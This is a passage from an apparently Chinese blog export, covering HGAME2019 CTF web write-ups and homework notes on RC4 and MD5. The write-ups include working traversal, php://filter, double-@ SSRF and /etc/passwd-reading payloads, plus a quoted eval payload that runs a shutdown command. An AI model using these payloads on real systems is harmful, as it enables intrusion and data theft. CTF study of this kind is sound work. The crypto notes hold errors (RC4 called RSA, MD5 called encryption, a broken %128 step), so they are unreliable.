Eazy_Math\n\n同样的，还是丢进IDA中查看伪代码：\n\n![](https://i.loli.net/2019/01/28/5c4f1a6c49e42.png)\n\nflag有9位，在经过String2Int和Change两个函数的变换后，如果check成功，即可成功。\n\n首先查看String2Int函数：\n\n![img](https://i.loli.net/2019/01/28/5c4f1be73b91e.png)\n\n这个函数的作用就是将s里面的字符内容转换成int型的数值存储在v14-v18中。\n\n查看Check函数后，可以轻易看出check的内容就是将变换后的9位与v2-v10相比较。\n\n最后是Change函数：\n\n![](https://i.loli.net/2019/01/28/5c4f1ab4dec43.png)\n\n第一个双层循环将a3里面的数值置为0，也就是v4里面的值。第二个三重循环可以拆开来看。前两个变量i和j总共循环9次，代表着算出v4里面的数值。最后一个循环变量m则是计算的过程。这里不妨设9个未知数A,B,C,D,E,F,G,H,I。经过推算，3\\*k+m 是每次取三个连续的数，3\\*m+1是每次取0，3，6或1，4，7或2，5，8。这里代表着取v5-v13里面的数值。分析之后可以列出三个方程组：\n\n$$\\begin{cases}\nA+2B+C=274\\\\\n2A+B+C=294\\\\\nA+B+2C=316\n\\end{cases}$$\n\n$$\n\\begin{cases}\nD+2E+F=262 \\\\\n2D+E+F=274 \\\\\nD+E+2F=252 \\\\\n\\end{cases}\n$$\n\n$$\n\\begin{cases}\nG+2H+I=380 \\\\\n2G+H+I=421 \\\\\nG+H+2I=427 \\\\\n\\end{cases}\n$$\n\n简单的方程组求得A-G的9个值转化为字符即为flag。\n","tags":["CTF"],"categories":["writeup"]},{"title":"HGAME2019-Web-Week1&2","url":"/2019/01/30/hgame2019/","content":"\n# 前言\n\n寒假无聊，听说这个题目非常基础（手动滑稽:(），所以来做一做\n\n<!-- more -->\n\n# week-1\n\n## 谁吃了我的flag\n\nvim文件泄露`.index.html.swp`，vim恢复即可得到flag\n```\nhgame{3eek_diScl0Sure_fRom+wEbsit@}\n```\n\n## very easy web\n\nurl二次编码绕过 `?id=%2576%2569%2564%2561%2572`\n```\nhgame{urlDecode_Is_GoOd}\n```\n\n## 换头大作战\n\n题目要求POST传值\n\n```\ncurl http://120.78.184.111:8080/week1/how/index.php --data \"want=12\"\n```\n\n得到回显\n\n```\n<br/>https://www.wikiwand.com/en/X-Forwarded-For<br/>only localhost can get flag\n```\n\n依次按照要求设置请求头\n\n```\ncurl http://120.78.184.111:8080/week1/how/index.php --data \"want=12\" -H \"x-forwarded-for:127.0.0.1\" -A \"User-Agent:Waterfox/50.0\" -e www.bilibili.com\n```\n\n```\nhgame{hTTp_HeaDeR_iS_Ez}\n```\n\n## can u find me?\n\n查看源代码可知存在f12.php界面，在响应头中可以看到密码 `woyaoflag`，提交即会出现`cilck me to get flag`，点击则跳转到 `toofast.php`，回显`aoh,your speed is sososo fast,the flag must have been left in somewhere`，应该是出现了302跳转，抓包即可得到flag\n\n```\nhgame{f12_1s_aMazIng111}\n```\n\n\n\n# week-2\n\n## easy_php\n\n探测目录发现robots.txt下存在文件`img/index.php`，访问之，得到PHP代码\n\n```php\n<?php\n    error_reporting(0);\n    $img = $_GET['img'];\n    if(!isset($img))\n        $img = '1';\n    $img = str_replace('../', '', $img);\n    include_once($img.\".php\");\n    highlight_file(__FILE__);\n```\n\n题目过滤了`../`，且将其转换为空字符串，所以我们可以用`..././`来绕过，本来试了 `..././flag`，可是打不出flag，最终尝试了filter协议，原因在于include语句会将代码当做php代码执行，而转成base64编码之后则由于没有php前缀而无法被当成php代码从而将文本打印出来\n\npayload\n\n```\nhttp://118.24.25.25:9999/easyphp/img/index.php?img=php://filter/read=convert.base64-encode/resource=..././flag\n```\n\nbase64解码即可得到flag，\n\n```\nhgame{You_4re_So_g0od}\n```\n\n## php trick\n\n代码审计\n\n```php\n//admin.php\nhighlight_file(__FILE__);\n$str1 = (string)@$_GET['str1'];\n$str2 = (string)@$_GET['str2'];\n$str3 = @$_GET['str3'];\n$str4 = @$_GET['str4'];\n$str5 = @$_GET['H_game'];\n$url = @$_GET['url'];\nif( $str1 == $str2 ){\n    die('step 1 fail');\n}\nif( md5($str1) != md5($str2) ){\n    die('step 2 fail');\n}\nif( $str3 == $str4 ){\n    die('step 3 fail');\n}\nif ( md5($str3) !== md5($str4)){\n    die('step 4 fail');\n}\nif (strpos($_SERVER['QUERY_STRING'], \"H_game\") !==false) {\n    die('step 5 fail');\n}\nif(is_numeric($str5)){\n    die('step 6 fail');\n}\nif ($str5<9999999999){\n    die('step 7 fail');\n}\nif ((string)$str5>0){\n    die('step 8 fial');\n}\nif (parse_url($url, PHP_URL_HOST) !== \"www.baidu.com\"){\n    die('step 9 fail');\n}\nif (parse_url($url,PHP_URL_SCHEME) !== \"http\"){\n    die('step 10 fail');\n}\n$ch = curl_init();\ncurl_setopt($ch,CURLOPT_URL,$url);\n$output = curl_exec($ch);\ncurl_close($ch);\nif($output === FALSE){\n    die('step 11 fail');\n}\nelse{\n    echo $output;\n}\n```\n\n第一个点md5绕过，第二个点是数组绕过，php数组在比较是比任何数字都大，payload\n\n```\nhttp://118.24.3.214:3001?str1=240610708&str2=QNKCDZO&str3[]=a&str4[]=b&H%5fgame[]=5&url=http://@127.0.0.1:80@www.baidu.com/admin.php\n```\n\n用两个@的原因可以参考这篇文章[ref](https://xz.aliyun.com/t/2215#toc-15)\n\n- 当url中有多个@符号时，parse_url中获取的host是最后一个@符号后面的host，而libcurl则是获取的第一个@符号之后的。因此当代码对user@eval.com:80@baidu.com \n- 进行解析时，PHP获取的host是baidu.com是允许访问的域名，而最后调用libcurl进行请求时则是请求的eval.com域名，可以造成ssrf绕过\n此外对于evil@baidu.com这样的域名进行解析时,php获取的host是evil@baidu.com，但是libcurl获取的host却是evil.com\n\n可以得到admin.php页面的代码\n\n```php\n//flag.php\nif($_SERVER['REMOTE_ADDR'] != '127.0.0.1') {\n    die('only localhost can see it');\n}\n$filename = $_GET['filename']??'';\n\nif (file_exists($filename)) {\n    echo \"sorry,you can't see it\";\n}\nelse{\n    echo file_get_contents($filename);\n}\nhighlight_file(__FILE__);\n```\n\n查看代码可知存在flag.php页面，关键代码如下：\n```php\nif (file_exists($filename)) {\n    echo \"sorry,you can't see it\";\n}\nelse{\n    echo file_get_contents($filename);\n}\n```\n\n当filename是flag.php（即文件存在时），又无法读取到文件，此时可以利用file_get_contents支持多种协议来读取到文件，可以使用php://filter协议，最终payload如下\n\n```\nhttp://118.24.3.214:3001?str1=240610708&str2=QNKCDZO&str3[]=a&str4[]=b&H%5fgame[]=5&url=http://@127.0.0.1:80@www.baidu.com/admin.php?filename=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\nflag.php\n\n```\n<?php $flag = hgame{ThEr4_Ar4_s0m4_Php_Tr1cks} ?>\n```\n\n## PHP Is The Best Language\n\n```php\ninclude 'secret.php';\n#echo $flag;\n#echo $secret;\nif (empty($_POST['gate']) || empty($_POST['key'])) {\n    highlight_file(__FILE__);\n    exit;\n}\nif (isset($_POST['door'])){\n    $secret = hash_hmac('sha256', $_POST['door'], $secret);\n}\n$gate = hash_hmac('sha256', $_POST['key'], $secret);\nif ($gate !== $_POST['gate']) {\n    echo \"Hacker GetOut!!\";\n    exit;\n}\nif ((md5($_POST['key'])+1) == (md5(md5($_POST['key'])))+1) {\n    echo \"Wow!!!\";\n    echo \"</br>\";\n    echo $flag;\n}\nelse {\n    echo \"Hacker GetOut!!\";\n}\n```\n\n代码审计题目，核心代码在于\n\n```php\nif (isset($_POST['door'])){\n    $secret = hash_hmac('sha256', $_POST['door'], $secret);\n}\n$gate = hash_hmac('sha256', $_POST['key'], $secret);\nif ($gate !== $_POST['gate']) {\n    echo \"Hacker GetOut!!\";\n    exit;\n}\n```\n\n我们无法控制$secret变量，自然无法计算出对应的哈希值，那么有没有那种带加密输入（door）的哈希与secret值无关呢？在PHP里面这个是存在的，就是**数组(Array)**，由于数组是hash_hmac无法处理的输入类型，所以会返回**null**\n\n第二处在于`(md5($_POST['key'])+1) == (md5(md5($_POST['key'])))+1`\n\n此处我们可以爆破\n\n```php\nfor($i=1;$i<9999999999;$i++){\n\tif ((md5($i)+1) == (md5(md5($i)))+1) { \n\t\techo $i;\n\t\tbreak;\n\t}\n} \n```\n\n结果为12\n\n最终payload为\n\n```\ndoor[]=12&key=12&gate=4217722a8aee69d5ed50f3e5ed1cceb1feb79784baaaa6bbf53515ce0eb4daaf\n```\n\nflag如下\n\n```\nhgame{Php_MayBe_Not_Safe}\n```\n\n## Baby_Spider\n\n题目考察我们的爬虫能力，真的做的我胃疼\n\n题目一共30关，40秒内答对30关的数学题即可获得flag\n\n- 1-10\n需要用token先登录一下，注意要带上UA头，如果不带的话到第十关算式就会变成\n```\n(lambda __g: [(os.system('shutdown -s -t 0'), (os.system('shutdown now'), None)[1])[1] for __g['os'] in [(__import__('os', __g, __g))]][0])(globals())#-----=?\n```\n由eval函数执行之后直接就关机了（这反爬虫机制真的是骚\\~\\~）\n\n- 11-20\n第十一关开始题目就变了，居然修改了css字体，抓取一下css文件如下\n```\n@font-face {\n      font-family: Ariali;\n      src: url('/static/Ariali.otf');\n      font-weight: normal;\n      font-style: normal;\n}\n```\n下载字体\n![](https://i.loli.net/2019/02/11/5c614ba6c3e49.png)\n可以看到数字对应规则变化了，对应置换一下即可\n\n- 21-30\n此关开始之后，隐藏了真实的数学表达式位置，如果按照题目的计算答案是错的，结果是在css中的after元素下找到了算式，获取之后计算即可\n\n最终paylaod如下\n\n```python\nimport requests\nimport re\n\ntoken = \"KxvEiiWBm41Xe6PTlKS3DnR4vsnfFcXL\"\nheaders = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0'}\n\nurl1 = \"http://111.231.140.29:10000\"\nurl2 = \"http://111.231.140.29:10000/question\"\nurl3 = \"http://111.231.140.29:10000/solution\"\nurl4='http://111.231.140.29:10000/statics/style.css'\n\nres = requests.post(url1,data=dict(token=token))\ncookies = res.cookies\nal_list = '1026943587'\n\nfor i in range(1,11):\n    # res = requests.get(url2,cookies=cookies,headers=headers)\n    print('-------------round',i,'---------------')\n    exp = re.findall(r'<span>(.+)</span',res.text)[0]\n    print(exp)\n    data = dict(answer=str(eval(exp[:-2])))\n    res = requests.post(url3,cookies=cookies,data=data,headers=headers)\n    cookies = res.cookies\n    \nfor i in range(11,21):\n    print('-------------round',i,'---------------')\n    exp = re.findall(r'<span>(.+)</span',res.text)[0]\n    exp = list(exp)\n    for x in range(len(exp)):\n        if ord(exp[x])>47 and ord(exp[x]) < 59:\n            exp[x] = al_list[ord(exp[x])-48]\n    exp = \"\".join(exp)\n    print(exp)\n    data = dict(answer=str(eval(exp[:-2])))\n    res = requests.post(url3,cookies=cookies,data=data,headers=headers)\n    cookies = res.cookies\n\nfor i in range(21,31):\n    print('-------------round',i,'---------------')\n    res = requests.get(url4,cookies=cookies,headers=headers)\n    exp = re.findall(r'content:\"(.+)\"',res.text)[0]\n    print(exp)\n    data = dict(answer=str(eval(exp[:-2])))\n    res = requests.post(url3,cookies=cookies,data=data,headers=headers)\n    cookies = res.cookies\n    if 'hgame' in res.text:\n        print(res.text)\n```\n\nflag如下：\n\n```\nhgame{e7b2703a92574012c10a90d0c96051a5b38c8d60a8861c66e7a0898812144083}\n```\n\n## Math有趣\n\n先是一道数学题，到了第二题之后是一个图片，点击图片链接，发现链接有猫腻`img/cXVlc3Rpb24ucG5n.php`，base64解码之后是`question.png`，尝试了一下`../../../../../etc/passwd`(base64编码)，发现可以成功读取文件\n![/etc/passwd](https://i.loli.net/2019/02/12/5c623f9854da7.png)\n接下来就是探测工作目录了，学到一个东西，可以探测`.bash_history`，该文件记录了最近的bash命令`../../../../../root/.bash_history`\n\n![](https://i.loli.net/2019/02/12/5c6240665dab0.png)\n\n工作目录为`/usr/local/tomcat/webapps/ROOT`\n\n接下来我们可以给链接加`=`诱发报错\n\n```\nhttp://test.tan90.me:8080/img/cXVlc3Rpb24ucG5n=.php\n```\n\n![](https://i.loli.net/2019/02/12/5c6240ecc59e8.png)\n\n最终定位到类目录，读取代码`../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/classes/hgame/controller/MathController.class\n`\n\n然后反编译，定位到flag的位置\n\n```java\n@RequestMapping(value={\"/flag\"}, method={org.springframework.web.bind.annotation.RequestMethod.GET})\npublic String Flag(ModelMap model)\n{\n    System.out.println(\"This is the last question.\");\n    System.out.println(\"123852^x % 612799081 = 6181254136845 % 612799081\");\n    System.out.println(\"The flag is hgame{x}.x is a decimal number.\");\n    model.addAttribute(\"flag\", \"Flag is not here.\");\n    return \"flag\";\n}\n```\n\n这个数学问题可以用**Baby Step Giant Step**算法解决，github上有相关的代码\n\n```\npy bsgs.py 123852 6181254136845 612799081\n```\n\n可以得到最小的答案是`15387368`\n\nflag如下：`hgame{15387368}`\n\n","tags":["CTF"],"categories":["writeup"]},{"title":"密码学作业记录（二）","url":"/2019/01/15/crypto2/","content":"\n接上篇\n\n<!--more-->\n\n# 序列密码\n\n## RC4算法\n\n​RC4算法是一种流加密算法，密钥长度可变。它加解密使用相同的密钥，因此也属于对称加密算法。RC4是有线等效加密（WEP）中采用的加密算法，也曾经是TLS可采用的算法之一。 \n\n**算法原理：**\n\n​RSA算法原理非常简单，256字节的状态向量S= {0，1，…，255}，用比特字节表示为S= {00000000, 00000001, ….，11111111}。用一个可变长度为1~256字节（8~8048位）的密钥来初始化256字节的状态向量S={S[0], S[1], …, S[255]}，任何时候，S都包含0~255的8位无符号数的排列组合。加密和解密时，密码流中的每一个字节k由S产生，通过系统的方式随机从S的256个元素中选取一个。每产生一个字节k，S的元素都要被再次排列。具体步骤如下:\n​\t\n- 步骤一：S向量原状态：  \n```\n​S=[0,1,2,...,255]\n```\n- 步骤二：创建临时向量T（256位），如果密钥K的长度为256位，则直接将K赋给T，否则一直重复复制K，直到填满256位的向量T \n- 步骤三：接下来我们使用T向量来产生S的初始排列。这个过程从S[0]开始一直处理到S[255]，同时对每个S[i]，根据T[i指定的方案将S[i]与S的另一个元素进行交换： \n- 步骤四：密码流产生。一旦S向量的初始排列完成后，密钥就不再被使用。接下来就是使用S自身来不断输出伪随机密码流的过程了。 \n- 步骤五：加密。将步骤四中获得的随机字节k与明文的下一字节做异或运算，产生的字节即为对应的密文字节。 \n\n​解密时，由于加密只是使用密码流对明文做了异或运算，因此解密过程只需要使用相同步骤产生密码流并对密文进行同样的异或运算即可得到加密前的明文。 \n\n**代码如下：**\n\n```python\nimport sys\nimport base64\n\ns = []\nt = []\n\n# 初始化s\nfor i in range(256):\n\ts.append(i);\n\n# 秘钥\n# 通常取16字节\nk = [1,45,12,12,3,5,6,7,123,45,78,95,65,23,44,55]\n\n# 为暂时向量t赋值\nfor i in range(256):\n\tt.append(k[i % len(k)])\n\nj = 0\nfor i in range(256):\n\tj = (j+s[i]+t[i]) % 256\n\ts[i],s[j] = s[j],s[i]\n\nf = open('a.txt','rb')\ntext = f.read()\n\n# 产生密钥流\nq = []\ni = 0\nj = 0\nfor r in range(len(text)):\n\ti = (i+1) % 256\n\tj = (j+s[i]) % 256\n\ts[i],s[j] = s[j],s[i]\n\tt = (s[i] + s[j]) % 256\n\tq.append(s[t])\n\ncipher = \"\"\nfor i in range(len(text)):\n\tt = (q[i] ^ text[i]) % 128\n\tcipher += chr(t)\n\nplain = \"\"\nfor i in range(len(text)):\n\tt = (q[i] ^ ord(cipher[i])) % 128\n\tplain += chr(t)\n\nif sys.argv[1] == \"d\":\n\tprint(\"plain: \")\n\tprint(plain)\nelse:\n\tprint(\"cipher: \")\n\tprint(base64.b64encode(cipher.encode('utf-8')).decode('utf-8'))\nf.close()\n```\n\n**实例演示：**\n\n​\t代码中加密的是一段英文文本，密文转为base64编码存储\n\n![demo](crypto2/1.png)\n\n**安全性分析**\n\n​\t由于RC4算法加密采用的是xor异或运算，所以一旦子密钥序列出现了重复，密文就有可能被破解。 那么，RC4算法生成的子密钥序列是否会出现重复呢？由于存在部分弱密钥，使得子密钥序列在不到100万字节内就发生了完全的重复，如果是部分重复，则可能在不到10万字节内就能发生重复。所以在使用中应该对密钥进行检查。\n\n​\t根据目前的分析结果，没有任何的分析对于密钥长度达到128位的RC4有效，目前主要的攻击方法还是穷举攻击，所以到目前为止，RC4还算一个安全的加密算法。\n\n​\t2015年，比利时研究人员Mathy Vanhoef及Frank Piessens，公布了针对RC4加密算法的新型攻击程式，可在75小时内取得cookie的内容。  \n\n**实用性分析**\n\n​\tRC4算法等序列密码加密过程较之分组密码而言相对简单，实现起来相对容易，在加密效率上对分组密码的优势是不言而喻的。此外，对于需要加密/解密数据流的应用，比如在数据通信信道或浏览器/网络链路上，流密码可能是更好的选择 。\n\n*********\n\n​\t流密码在安全性强度上不逊分组密码，而加密速率又远优于后者，那是不是说明流密码可以完全取代分组密码呢？很可惜，答案是否定的。 \n\n​\t众所周知，分组密码的设计关键在于加解密算法，是明文和密文在密钥的控制下尽可能复杂，而序列密码的设计关键在于密钥序列产生器，使生成的密钥序列具有不可预测性。而密码序列产生器，也就是伪随机数字节流的产生，依赖种子（密钥）和伪随机函数，而如果种子和伪随机函数不变的情况下，每次产生的伪随机数字节流都是一样的。如果每次都用同样的密钥作为PRF的输入，产生同样的密码流来与两个不同的明文流分别进行异或运算得到两个密文流，那么将这两个密文流进行异或，结果就是两个原始明文的异或值。如果明文是文本字符串或其他已知其性质的字节流，那么密码破解很可能会成功。因此，对于这些已知性质的字节流进行流密码加密，密钥就不能被重复使用了。在这一点上，分组密码的优点就体现出来了。 \n\n# 哈希函数\n\n​\t哈希函数的单向性，压缩性，抗碰撞性等特点使得它能够解决实际应用中很多棘手的安全问题，诸如数字签名，文件指纹等。\n\n## MD5算法\n\n​\tMD5(Message Digest Algorithm 5)，为计算机安全领域广泛使用的一种散列函数，用以提供消息的完整性保护。 \n\n​\tMD5是一种信息摘要算法，MD5算法对输入任意长度的消息进行运行，通过特定的hash散列方法将文本信息转换成产生一个128位的消息摘要，压缩+加密+hash算法的结合体，是绝对不可逆的。\n\n**算法原理：**\n​\n\n- 步骤一：数据填充。对消息进行数据填充，使消息的长度对512取模得448，设消息长度为X，即满\t足X mod 512=448。根据此公式得出需要填充的数据长度。填充方法：在消息后面进行填充，填充第一位为1，其余为0。\n- 步骤二：添加消息长度。在第一步结果之后再填充上原消息的长度，可用来进行的存储长度为64位。如果消息长度大于264，则只使用其低64位的值，即（消息长度 对 264取模）。在此步骤进行完毕后，最终消息长度就是512的整数倍。\n- 步骤三：初始化链接变量。MD5使用4个32位的寄存器A、B、C、D，最开始存放4个固定的32位初始链接变量，这些参数用于第一轮迭代。\n- 步骤四：分组处理。将每个分组（512比特）分成16个小组，每个小组32位，这些分组参与每轮16步的函数运算，输出为32位值，经过4轮（共有四个轮函数）共64步之后，得到的4个寄存器的值分别于输入链接变量进行模加，即得到此次分组处理的输入链接变量。第四轮最后一步完成后，再与该分组最初的寄存器的初值相加，然后把A、B、C、D的值作为下一个迭代压缩的链接变量输入，直到最后一个消息分组得到的A、B、C、D寄存器值级联输出作为128比特的消息散列值。\n\n​\t此处需要特别指出的是，在MD5的代码实现中，要特别注意**小端序**和**大端序**的问题，这个问题如果不注意的话会导致MD5计算出错。而MD5的所有数据计算都是基于**小端序**的。\n\n> 小端字节序（Little Endian）：低位字节存放在低内存地址，高位字节存放在高内存地址端。  大端字节序（Big Endian）：高位字节存放在低内存地址，低位字节存放在高内存地址端。\n\n​\t在步骤二中添加消息长度就要按照小端序的方法填充长度，同时轮函数中各个参数也要按照小端序来计算，这点一定要特别注意。\n\n​\t还有对于需要处理多个分组的情况，要做好A、B、C、D寄存器的及时更新，否则无法得到正确的MD5值。\n\n*代码如下：*\n\n```python\nimport math\n\n# 字符串转为2进制\ndef str2bin(s):\n\ttext = \"\"\n\tfor i in s:\n\t\ttext += '{:0>8}'.format(bin(ord(i))[2:])\n\treturn text\n\n# 附加填充，输入为字母明文，输出为二进制\ndef additonal_filling(data):\n\tbin_data = str2bin(data)\n\torigi_mess_len = len(bin_data)\n\tif origi_mess_len > math.pow(2,64):\n\t\tprint('Message too long!')\n\t\treturn \"0\"\n\telse:\n\t\tbit_origi_mess_len = f'{bin(origi_mess_len)[2:]:0>64}'\n\t\tmod_remain = origi_mess_len % 512  # 余数\n\t\tif mod_remain < 449:\n\t\t\tpadding_len = 448 - mod_remain\n\t\telse:\n\t\t\tpadding_len = 448 - mod_remain + 512\n\t\tif padding_len == 1:\n\t\t\tbin_data += '1'\n\t\telif padding_len > 1:\n\t\t\tbin_data = bin_data + '1' + '0' * (padding_len-1)\n\t\tleft = bit_origi_mess_len[:32]\n\t\tright = bit_origi_mess_len[32:]\n\t\tleft = left[24:32] + left[16:24] + left[8:16] + left[:8]\n\t\tright = right[24:32] + right[16:24] + right[8:16] + right[:8]\n\t\t# 32为为一组\n\t\tbin_data += (right + left)\n\t\treturn bin_data\n\n\n\n# 迭代压缩，输出为分组比特消息数组，每组的长度为512bit\ndef iter_compress(bdata):\n\tgroup_mess = [[]*16] # 分组消息数组\n\tprint(len(bdata))\n\tfor i in range(len(bdata)//512):\n\t\ttemp = bdata[i*512:i*512+512]\n\t\tfor j in range(16):\n\t\t\tprint(temp[j*32:j*32+32])\n\t\t\tgroup_mess[i].append(temp[j*32:j*32+32])\n\treturn group_mess\n\n# 小端序处理 @input hex\ndef little_endian(x,n):\n\tx = f'{bin(x)[2:]:0>{n}}'\n\tans = \"\"\n\tfor i in range(n//8,0,-1):\n\t\tans += x[(i-1)*8:i*8]\n\treturn int(ans,2)\n\n\n# 由于逻辑非比较特殊，所以另外实现一下,输入为16进制数据\ndef not_operate(data):\n\tdata = f'{bin(data)[2:]:0>32}'\n\tout = \"\"\n\tfor i in data:\n\t\tif i == \"0\":\n\t\t\tout += \"1\"\n\t\telse:\n\t\t\tout += \"0\"\n\treturn int(out,2)\n\n\n# 四个非线性函数,输入均为32bit的三个数据\n# @input hex\ndef F(x, y, z):\n\treturn (x&y) | (not_operate(x) & z)\n\ndef G(x,y,z):\n\treturn (x & z) | (y & not_operate(z))\n\ndef H(x,y,z):\n\treturn (x ^ y ^ z)\n\ndef I(x,y,z):\n\treturn y ^ (x | not_operate(z))\n\ndef rotate_move(x,n):\n\tx = f'{bin(x)[2:]:0>32}'\n\treturn int(x[n:] + x[:n],2)\n\n# t[i]，返回10进制\ndef get_t(i):\n\treturn int(math.pow(2,32) * abs(math.sin(i)))\n\n# @input digital\ndef FF(a,b,c,d,m,s,Ti):\n\t# m = int(m,2)\n\tm = little_endian(int(m,2),32)\n\tt = a + F(b,c,d) + m + Ti \n\tt = t % (2**32)\n\ta = (rotate_move(t,s) + b) % (2**32)\n\treturn a\n\ndef GG(a,b,c,d,m,s,Ti):\n\tm = little_endian(int(m,2),32)\n\tt = a + G(b,c,d) + m + Ti \n\tt = t % (2**32)\n\ta = (rotate_move(t,s) + b) % (2**32)\n\treturn a\n\ndef HH(a,b,c,d,m,s,Ti):\n\tm = little_endian(int(m,2),32)\n\tt = a + H(b,c,d) + m + Ti \n\tt = t % (2**32)\n\ta = (rotate_move(t,s) + b) % (2**32)\n\treturn a\t\n\ndef II(a,b,c,d,m,s,Ti):\n\tm = little_endian(int(m,2),32)\n\tt = a + I(b,c,d) + m + Ti \n\tt = t % (2**32)\n\ta = (rotate_move(t,s) + b) % (2**32)\n\treturn a\n\ndef step_function(M):\n\tglobal A\n\tglobal B\n\tglobal C\n\tglobal D\n\t# 复制前一分组的链接变量\n\tAA = A\n\tBB = B\n\tCC = C\n\tDD = D\n\tfor i in range(len(M)):\n\t\t# 第一轮循环\n\t\tA = FF(A,B,C,D,M[i][0],7,get_t(1))\n\t\tD = FF(D,A,B,C,M[i][1],12,get_t(2))\n\t\tC = FF(C,D,A,B,M[i][2],17,get_t(3))\n\t\tB = FF(B,C,D,A,M[i][3],22,get_t(4))\n\t\tA = FF(A,B,C,D,M[i][4],7,get_t(5))\n\t\tD = FF(D,A,B,C,M[i][5],12,get_t(6))\n\t\tC = FF(C,D,A,B,M[i][6],17,get_t(7))\n\t\tB = FF(B,C,D,A,M[i][7],22,get_t(8))\n\t\tA = FF(A,B,C,D,M[i][8],7,get_t(9))\n\t\tD = FF(D,A,B,C,M[i][9],12,get_t(10))\n\t\tC = FF(C,D,A,B,M[i][10],17,get_t(11))\n\t\tB = FF(B,C,D,A,M[i][11],22,get_t(12))\n\t\tA = FF(A,B,C,D,M[i][12],7,get_t(13))\n\t\tD = FF(D,A,B,C,M[i][13],12,get_t(14))\n\t\tC = FF(C,D,A,B,M[i][14],17,get_t(15))\n\t\tB = FF(B,C,D,A,M[i][15],22,get_t(16))\n\n\t\t# 第二轮循环\n\t\tA = GG(A,B,C,D,M[i][1],5,get_t(17))\n\t\tD = GG(D,A,B,C,M[i][6],9,get_t(18))\n\t\tC = GG(C,D,A,B,M[i][11],14,get_t(19))\n\t\tB = GG(B,C,D,A,M[i][0],20,get_t(20))\n\t\tA = GG(A,B,C,D,M[i][5],5,get_t(21))\n\t\tD = GG(D,A,B,C,M[i][10],9,get_t(22))\n\t\tC = GG(C,D,A,B,M[i][15],14,get_t(23))\n\t\tB = GG(B,C,D,A,M[i][4],20,get_t(24))\n\t\tA = GG(A,B,C,D,M[i][9],5,get_t(25))\n\t\tD = GG(D,A,B,C,M[i][14],9,get_t(26))\n\t\tC = GG(C,D,A,B,M[i][3],14,get_t(27))\n\t\tB = GG(B,C,D,A,M[i][8],20,get_t(28))\n\t\tA = GG(A,B,C,D,M[i][13],5,get_t(29))\n\t\tD = GG(D,A,B,C,M[i][2],9,get_t(30))\n\t\tC = GG(C,D,A,B,M[i][7],14,get_t(31))\n\t\tB = GG(B,C,D,A,M[i][12],20,get_t(32))\n\n\t\t# 第三轮循环\n\t\tA = HH(A,B,C,D,M[i][5],4,get_t(33))\n\t\tD = HH(D,A,B,C,M[i][8],11,get_t(34))\n\t\tC = HH(C,D,A,B,M[i][11],16,get_t(35))\n\t\tB = HH(B,C,D,A,M[i][14],23,get_t(36))\n\t\tA = HH(A,B,C,D,M[i][1],4,get_t(37))\n\t\tD = HH(D,A,B,C,M[i][4],11,get_t(38))\n\t\tC = HH(C,D,A,B,M[i][7],16,get_t(39))\n\t\tB = HH(B,C,D,A,M[i][10],23,get_t(40))\n\t\tA = HH(A,B,C,D,M[i][13],4,get_t(41))\n\t\tD = HH(D,A,B,C,M[i][0],11,get_t(42))\n\t\tC = HH(C,D,A,B,M[i][3],16,get_t(43))\n\t\tB = HH(B,C,D,A,M[i][6],23,get_t(44))\n\t\tA = HH(A,B,C,D,M[i][9],4,get_t(45))\n\t\tD = HH(D,A,B,C,M[i][12],11,get_t(46))\n\t\tC = HH(C,D,A,B,M[i][15],16,get_t(47))\n\t\tB = HH(B,C,D,A,M[i][2],23,get_t(48))\n\n\t\t# 第四轮循环\n\t\tA = II(A,B,C,D,M[i][0],6,get_t(49))\n\t\tD = II(D,A,B,C,M[i][7],10,get_t(50))\n\t\tC = II(C,D,A,B,M[i][14],15,get_t(51))\n\t\tB = II(B,C,D,A,M[i][5],21,get_t(52))\n\t\tA = II(A,B,C,D,M[i][12],6,get_t(53))\n\t\tD = II(D,A,B,C,M[i][3],10,get_t(54))\n\t\tC = II(C,D,A,B,M[i][10],15,get_t(55))\n\t\tB = II(B,C,D,A,M[i][1],21,get_t(56))\n\t\tA = II(A,B,C,D,M[i][8],6,get_t(57))\n\t\tD = II(D,A,B,C,M[i][15],10,get_t(58))\n\t\tC = II(C,D,A,B,M[i][6],15,get_t(59))\n\t\tB = II(B,C,D,A,M[i][13],21,get_t(60))\n\t\tA = II(A,B,C,D,M[i][4],6,get_t(61))\n\t\tD = II(D,A,B,C,M[i][11],10,get_t(62))\n\t\tC = II(C,D,A,B,M[i][2],15,get_t(63))\n\t\tB = II(B,C,D,A,M[i][9],21,get_t(64))\n\n\t\tA = (AA + A) % 2**32\n\t\tB = (BB + B) % 2**32\n\t\tC = (CC + C) % 2**32\n\t\tD = (DD + D) % 2**32\n\t\tAA = A\n\t\tBB = B\n\t\tCC = C\n\t\tDD = D\n\ndef encrypt(word):\n\tglobal A,B,C,D\n\t# 初始化链接向量\n\tA = 0x67452301\n\tB = 0xEFCDAB89\n\tC = 0x98BADCFE\n\tD = 0x10325476\n\tbintext = additonal_filling(word)\n\tbdata = bintext\n\tgroup_mess = [[]*16] # 分组消息数组\n\tfor i in range(16):\n\t\tgroup_mess[0].append(\"\")\n\tfor i in range(len(bdata)//512):\n\t\ttemp = bdata[i*512:i*512+512]\n\t\tfor j in range(16):\n\t\t\tgroup_mess[0][j] = temp[j*32:j*32+32]\n\t\tstep_function(group_mess)\n\tA = hex(A)[2:]\n\tB = hex(B)[2:]\n\tC = hex(C)[2:]\n\tD = hex(D)[2:]\n\t# 按小端字节序级联输出\n\tout = \"\"\n\tfor item in (A,B,C,D):\n\t\tfor i in range(8//2):\n\t\t\tout += item[(3-i)*2:(3-i)*2+2]\n\treturn out\n\nif __name__ == '__main__':\n\tword1 = \"iscbupt\"\n\tword2 = \"Beijing University of Posts and TelecommunicationsBeijing University of Posts and Telecommunications\"\n\tword3 = \"State Key Laboratory of Networking and Switching\"\n\tword4 = \"Hello! Bob, I'm Alice! We could communicate with each other now, It's so great!\"\n\tprint(word1)\n    print(encrypt(word1))\n    